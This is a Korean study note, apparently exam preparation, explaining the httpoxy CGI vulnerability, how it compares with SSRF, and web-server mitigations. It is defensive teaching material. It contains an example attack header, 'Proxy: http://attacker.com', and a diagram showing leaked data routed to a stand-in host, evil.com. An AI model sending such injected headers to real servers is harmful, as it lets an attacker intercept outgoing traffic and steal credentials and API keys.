## 핵심 인사이트 (3줄 요약)
> 1. **본질**: httpoxy는 HTTP 요청 헤더의 `Proxy` 필드가 CGI 환경에서 `HTTP_PROXY` 환경변수로 잘못 매핑되어 발생하는 취약점이다.
> 2. **가치**: 공격자가 서버의 서버 측 요청(Outgoing Request)을 자신의 프록시 서버로 유도하여 데이터를 탈취하거나 중간자 공격(MITM)을 수행할 수 있게 한다.
> 3. **판단 포인트**: 신뢰할 수 없는 `Proxy` 헤더를 차단하거나, 애플리케이션 라이브러리가 환경변수보다 안전한 설정을 우선하도록 구성해야 한다.

---

## Ⅰ. 개요 및 필요성

**httpoxy**는 RFC 3875(CGI 사양)에 따라 HTTP 요청 헤더가 `HTTP_` 접두사를 붙여 환경변수로 변환되는 과정에서 발생하는 설계 결함 기반 취약점이다. 클라이언트가 보낸 `Proxy: http://attacker.com` 헤더가 서버 내부에서 `HTTP_PROXY` 환경변수로 설정되는데, 많은 언어의 표준 라이브러리(PHP, Go, Python 등)가 이 변수를 외부 통신용 프록시 설정으로 자동 인식하면서 문제가 발생한다.

이 취약점이 치명적인 이유는 별도의 코드 결함 없이도 서버의 기본 동작 방식 때문에 발생하기 때문이다. 서버가 외부 API를 호출하거나 인증 서버와 통신할 때 공격자의 서버를 거치게 되면, API 키, 사용자 자격 증명, 민감한 비즈니스 데이터가 평문으로 유출될 위험이 크다.

- **📢 섹션 요약 비유**: httpoxy는 외부 손님이 보낸 "비서의 연락처" 메모를 회사가 공식 비서 번호로 등록해버려, 모든 대외 업무 메일이 손님의 집을 거쳐 가는 상황과 같다.

---

## Ⅱ. 아키텍처 및 핵심 원리

httpoxy의 핵심은 **환경변수 오염(Environment Variable Pollution)**이다. CGI 아키텍처는 클라이언트 요청의 모든 헤더를 환경변수로 넘겨주는데, 하필 `HTTP_PROXY`라는 이름이 시스템의 프록시 설정 변수명과 충돌하면서 실행 흐름이 뒤바뀐다.

```text
┌───────────┐  1. Proxy: evil.com  ┌─────────────┐  2. Set HTTP_PROXY  ┌─────────────┐
│  Attacker │ ───────────────────▶ │ Web Server  │ ──────────────────▶ │ CGI App     │
└───────────┘                      │ (Nginx/Apache)│                   │ (PHP/Python)│
                                   └─────────────┘                     └──────┬──────┘
                                                                              │
┌───────────┐                      4. Data Leak                        3. Outgoing Request
│ Proxy Srv │ ◀───────────────────────────────────────────────────────────────┘
│ (evil.com)│       (via Attacker's Proxy instead of direct/safe proxy)
└───────────┘
```

| 단계 | 구성 요소 | 동작 및 영향 |
|:---|:---|:---|
| 1. 주입 | 클라이언트 헤더 | `Proxy: http://attacker.com` 헤더를 포함한 요청 발송 |
| 2. 매핑 | 웹 서버 (CGI) | 헤더명을 대문자화하고 `HTTP_`를 붙여 `HTTP_PROXY` 환경변수 생성 |
| 3. 인식 | 언어 라이브러리 | `getenv("HTTP_PROXY")`를 통해 외부 요청 시 사용할 프록시 주소 획득 |
| 4. 탈취 | 공격자 프록시 | 서버가 보내는 내부 데이터, API 호출 내용 등을 가로채기 수행 |

- **📢 섹션 요약 비유**: httpoxy는 내 가방(HTTP Header)에 넣어둔 가짜 내비게이션(Proxy)을 운전사(Server)가 공식 장비로 믿고 따라가는 유도 장치와 같다.

## Ⅲ. 비교 및 연결

httpoxy는 다른 인젝션 공격과 달리 코드 실행(RCE)이 목적이 아니라 **트래픽 흐름 조작**이 목적이다. 이는 SSRF(Server-Side Request Forgery)와 유사하지만, SSRF가 '목적지'를 조작한다면 httpoxy는 '경로'를 조작한다는 차이가 있다.

| 항목 | httpoxy | SSRF (Server-Side Request Forgery) |
|:---|:---|:---|
| **조작 대상** | 통신 경로 (Proxy 설정) | 최종 목적지 URL |
| **발생 원인** | 환경변수 이름 충돌 (CGI 규격) | 입력값 검증 미흡 (URL 파라미터) |
| **주요 위협** | 데이터 유출, MITM | 내부망 스캔, 로컬 자원 접근 |
| **방어 계층** | 웹 서버 설정 (헤더 차단) | 애플리케이션 로직 (화이트리스트) |

- **📢 섹션 요약 비유**: httpoxy는 우편물을 배달하는 트럭의 '경로'를 바꾸는 것이고, SSRF는 편지 봉투에 적힌 '주소'를 바꾸는 것이다.

## Ⅳ. 실무 적용 및 기술사 판단

실무에서 httpoxy 대응의 최우선 순위는 **웹 서버 레벨에서의 차단**이다. 애플리케이션 코드를 모두 수정하는 것보다 입구에서 `Proxy` 헤더 자체를 드롭(Drop)하는 것이 가장 빠르고 확실한 해결책이다.

### 체크리스트
1. **웹 서버 설정**: Nginx나 Apache에서 `Proxy` 헤더를 명시적으로 제거하고 있는가?
   - Nginx: `fastcgi_param HTTP_PROXY "";`
   - Apache: `RequestHeader unset Proxy`
2. **CGI 사용 여부**: PHP-FPM, Python CGI, Go CGI 등 환경변수를 사용하는 인터페이스를 쓰고 있는가?
3. **라이브러리 업데이트**: 최신 버전의 Guzzle, Requests 등 프록시 설정을 안전하게 처리하는 라이브러리를 사용 중인가?

### 안티패턴
- `HTTP_PROXY` 환경변수를 애플리케이션 코드 내에서 수동으로 초기화하지 않고 방치하는 것.
- 내부망 통신이므로 보안이 필요 없다고 생각하여 HTTP(평문) 통신을 사용하는 것.

- **📢 섹션 요약 비유**: 정문에서 수상한 안내 표지판(Proxy 헤더)을 압수하는 것이 건물 안의 모든 직원을 교육하는 것보다 효율적이다.

## Ⅴ. 기대효과 및 결론

httpoxy 대응을 통해 서버의 아웃바운드 트래픽에 대한 통제권을 확보할 수 있다. 이는 단순한 취약점 방어를 넘어, 서버가 신뢰할 수 없는 외부 경로를 통해 데이터를 유출하지 않도록 보장하는 **신뢰 경계(Trust Boundary)**를 공고히 하는 작업이다.

결론적으로 httpoxy는 레거시 규격(CGI)과 현대적 편의성(자동 프록시 설정)이 충돌하여 생긴 보안 사고의 전형이다. 기술사는 이를 단순한 버그가 아닌, **환경변수 관리와 규격 충돌**의 관점에서 이해하고 전체 인프라 차원의 방어 전략을 제시해야 한다.

- **📢 섹션 요약 비유**: 오래된 규칙과 새로운 장비 사이의 틈새를 메워야 안전한 시스템 운영이 가능해진다.

### 📌 관련 개념 맵

| 개념 | 연결 포인트 |
|:---|:---|
| **CGI (Common Gateway Interface)** | 취약점의 근간이 되는 웹 서버-애플리케이션 인터페이스 규격 |
| **SSRF** | 서버 측 요청을 조작한다는 점에서 공격 메커니즘이 상통함 |
| **MITM (Man-In-The-Middle)** | 프록시를 통해 이루어지는 최종적인 공격 형태 |
| **환경변수 오염** | 프로세스 실행 환경을 조작하여 의도치 않은 동작을 유발하는 기법 |
